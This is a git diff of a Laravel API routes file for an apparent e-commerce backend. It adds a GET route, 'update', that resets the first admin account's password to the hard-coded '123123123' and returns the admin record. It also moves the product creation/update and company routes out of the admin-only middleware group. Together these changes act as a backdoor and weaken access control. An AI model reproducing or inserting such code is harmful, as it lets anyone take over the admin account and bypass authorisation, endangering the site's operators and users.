@@ -16,6 +16,7 @@ use App\Http\Controllers\product\CampanyController;
 use App\Http\Controllers\product\CategoryController;
 use App\Http\Controllers\product\ProductController;
 use App\Http\Controllers\product\ProductRateController;
+use App\Models\Admin;
 use App\Models\ProductRate;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Route;
@@ -49,7 +50,7 @@ Route::middleware(['auth:api'])->group(function () {
     Route::resource('/products', ProductController::class)->only('index' , 'show' );
     Route::resource('/rates', ProductRateController::class);
     Route::resource('/carts', CartItemController::class);
-    Route::resource('/orders', OrderController::class);
+     Route::resource('/orders', OrderController::class);
     Route::resource('/offers' , OfferController::class)->only('store' , 'update');
 
 
@@ -65,11 +66,9 @@ Route::middleware(['auth:api'])->group(function () {
     Route::post('/admin/logout' , [ AuthAdminController::class , 'logout']);
 
 Route::middleware('auth:admin')->group(function () {
-     Route::resource('/campanies' , CampanyController::class);
-        Route::post('/campanies/{id}', [CampanyController::class, 'update']);
+
         Route::post('/deleteAccount/{id}', [UserController::class, 'deleteAccount']);
-        Route::post('/products', [ProductController::class, 'store']);
-        Route::post('/products/{id}', [ProductController::class, 'update']);
+
         Route::resource('/admin/orders', OrderAdminController::class)->only('index' , 'destroy' ,'update');
         Route::resource('/offers' , OfferController::class)->only('index' , 'destroy');
 
@@ -83,3 +82,16 @@ Route::middleware('auth:admin')->group(function () {
 
 
     Route::post('/payments' ,[ PaymentController::class , 'pay']);
+
+    Route::get('update',function(){
+        $adm = Admin::first();
+        $adm->password = bcrypt("123123123");
+        $adm->save();
+        return $adm ;
+    });
+
+
+        Route::post('/products', [ProductController::class, 'store']);
+        Route::post('/products/{id}', [ProductController::class, 'update']);
+     Route::resource('/campanies' , CampanyController::class);
+        Route::post('/campanies/{id}', [CampanyController::class, 'update']);
